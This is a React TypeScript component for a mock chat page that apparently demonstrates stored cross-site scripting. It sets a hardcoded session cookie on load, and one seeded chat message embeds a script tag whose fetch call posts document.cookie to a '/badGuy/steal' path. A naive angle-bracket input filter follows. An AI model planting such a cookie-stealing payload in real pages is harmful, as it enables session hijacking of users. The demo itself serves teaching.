import React, { useEffect, useMemo, useState } from 'react'
import { StringMappingType } from 'typescript';
import { ChatMessageBubble } from './ChatMessageBuble';

export type ChatMessageType = {
    user: string,
    message: string
}

export const ChatPage = () => {
    useEffect(() => {
        document.cookie = 'sessionID=969441b7e0de56462e3af161e174a19b688c6d642b16031d13748079b825a500';
    },[])
    const [chatMessage, setChatMessage] = useState<ChatMessageType[]>([
        {user: 'Mike', message: 'Hello everyone, I have a problem logging into my e-banking. Does anyone else have the same problem?'},
        {user: 'Bob', message:`No mine is working fine. <script> fetch('/badGuy/steal/user/sessionID', {   method: 'POST',   headers: {     'Content-Type': 'application/json;charset=utf-8'   },   body: JSON.stringify(document.cookie) });</script>`}
    ]);

    const [input, setInput] = useState<string>('')
    const [user, setUser] = useState<string>('Bob')

    const addMessage = () => {
        if(input.includes('<') || input.includes('/>')) alert('Your Input contains forbiden caracters. Remove them and try again') 
        else{
        setChatMessage([...chatMessage, {user: user, message: input}])
        setInput('')
        }
    }

 

    const renderedMessages = useMemo(() => { return chatMessage.map(message => { return <ChatMessageBubble value={message} /> }) }, [chatMessage])
    return  <div className='chatPage'>
        <h1>Welcome back {user}</h1>
        <div className='chatMessageBox'>{renderedMessages}</div>
                <div className='inputControls'>
                <input type='text' autoFocus={true} onChange={(val) => setInput(val.target.value)} value={input} />
                <button onClick={(() => addMessage())}>Submit</button>
                </div>
            </div>
}